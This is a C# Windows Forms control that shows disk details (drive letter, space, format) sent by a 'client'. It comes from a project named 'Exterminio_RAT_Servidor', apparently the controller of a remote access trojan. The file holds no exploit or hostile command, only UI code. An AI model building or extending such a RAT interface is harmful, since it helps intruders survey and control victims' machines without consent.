using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Exterminio_RAT_Servidor
{
    public partial class CardDiscos : UserControl
    {
        // Evento público para cuando se hace clic en la card
        public event EventHandler<DiskInfo> CardClicked;

        public CardDiscos()
        {
            InitializeComponent();
            SetupClickableCard();
        }

        private void SetupClickableCard()
        {
            // Hacer que todo el UserControl sea clickeable
            this.Click += (sender, e) => OnCardClicked();
            this.MouseClick += (sender, e) => OnCardClicked();
            
            // Hacer que el panel principal también sea clickeable
            guna2CustomGradientPanel1.Click += (sender, e) => OnCardClicked();
            guna2CustomGradientPanel1.MouseClick += (sender, e) => OnCardClicked();
            
            // Hacer que todos los controles internos también propaguen el clic
            foreach (Control control in guna2CustomGradientPanel1.Controls)
            {
                control.Click += (sender, e) => OnCardClicked();
                control.MouseClick += (sender, e) => OnCardClicked();
            }
            
            // Configurar cursor
            this.Cursor = Cursors.Hand;
            guna2CustomGradientPanel1.Cursor = Cursors.Hand;
        }

        private void OnCardClicked()
        {
            Console.WriteLine($"Card de disco clickeada: {labelInfoDisco.Text}");
            
            // Disparar el evento público con la información del disco
            if (CardClicked != null)
            {
                // Crear un objeto DiskInfo con la información del disco
                DiskInfo discoInfo = new DiskInfo
                {
                    LetraUnidad = labelInfoDisco.Text,
                    Modelo = "Disco del Sistema",
                    TamanoTotal = labelInfoEspacio.Text.Split('/')[0].Trim(),
                    EspacioLibre = labelInfoEspacio.Text.Split('/')[1].Trim(),
                    TipoParticion = labelInfoFormato.Text
                };
                
                CardClicked(this, discoInfo);
            }
        }

        public void DestectarDiscosClentesID(string Disco, string Espacio, string Formato)
        {
            // Solo configurar los labels de info con la información real del cliente
            labelInfoDisco.Text = Disco;
            labelInfoEspacio.Text = Espacio;
            labelInfoFormato.Text = Formato;
       
        }
    }
}
